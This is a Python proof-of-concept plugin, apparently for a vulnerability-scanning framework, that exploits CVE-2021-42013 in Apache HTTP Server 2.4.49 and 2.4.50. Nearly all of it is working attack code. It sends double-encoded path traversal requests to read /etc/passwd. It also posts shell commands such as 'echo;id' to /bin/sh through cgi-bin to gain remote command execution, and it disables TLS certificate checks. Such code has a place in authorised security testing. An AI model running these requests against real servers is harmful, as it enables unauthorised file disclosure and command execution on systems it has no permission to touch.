import pocs
import urllib.request
import ssl
import urllib3
from colorama import init
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=False) 

class POC(pocs.Pocs):

    def __init__(self):
        '''
            初始化函数
        '''
        super().__init__()
        self.poc_name='Apache HTTP Server 路径穿越及命令执⾏漏洞'
        self.vul_name='Apache HTTP Server 路径穿越及命令执⾏漏洞'
        self.vul_num='CVE-2021-42013'
        self.app_name='Apache HTTP Server'
        self.app_version='2.4.49 2.4.50'
        self.author='haochen'
        self.msg='''攻击者可以使⽤路径遍历攻击将 URL 映射到由类似别名的指令配置的⽬录之外的⽂件。'''
        self.must_parameter={
            'target' : ''
        }

    def exploit(self, must_parameter, choo_parameter):
        att_msg = {}
        url = must_parameter['target']
        att_msg['target']=url
        att_msg['pocname'] = self.poc_name
        head = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9'
        }
        msg1 = self.cve_2021_41773_read(url,head)
        msg2 = self.cve_2021_41773_command(url,head)
        if '存在' in msg1:
            att_msg['status'] = 'success'
            att_msg['msg'] = msg1
        if '存在' in msg2:
            att_msg['status'] = 'success'
            att_msg['msg'] = msg1 +'\n' + msg2
        if '存在' not in msg1 and '存在' not in msg2: 
            att_msg['status'] = 'failed'
            att_msg['msg'] = '不存在该漏洞！'
        return att_msg

    def cve_2021_41773_read(self,url,head):
        if url[-1] == '/':
            url += 'icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'
        else:
            url += '/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'
        context = ssl._create_unverified_context()
        try:
            request = urllib.request.Request(url=url,headers=head)
            response = urllib.request.urlopen(request,context=context)
            if 'root' in response.read().decode('utf-8'):
                msg = '存在CVE-2021-42013路径穿越漏洞 ' + url
                return msg
            else:
                return '不存在CVE-2021-42013路径穿越漏洞' + url
        except:
            return 'error! 目标网站无法正常访问！'

    def cve_2021_41773_command(self,url,head):
        if url[-1] == '/': 
            url += 'cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'
        else:
            url += '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'
        data1 = "echo;id"
        data2 = "echo Content-Type: text/plain; echo; id"
        context = ssl._create_unverified_context()
        msg = ''
        try:
            request1 = urllib.request.Request(url=url,headers=head,data=data1.encode('utf-8'))
            response1 = urllib.request.urlopen(request1,context=context)
            request2 = urllib.request.Request(url=url,headers=head,data=data2.encode('utf-8'))
            response2 = urllib.request.urlopen(request2,context=context)
            if 'uid' in response1.read().decode('utf-8') :
                msg += '存在CVE-2021-42013路径穿越及命令执⾏漏洞 ' + url +' payload为 ' + data1
            elif 'uid' in response2.read().decode('utf-8'):
                msg += '存在CVE-2021-42013路径穿越及命令执⾏漏洞 ' + url +' payload为 ' + data2
            else:
                msg += '[-] 不存在CVE-2021-42013路径穿越及命令执⾏漏洞' + url
            return msg
        except:
            return '[-] error! 目标网站无法正常访问！'



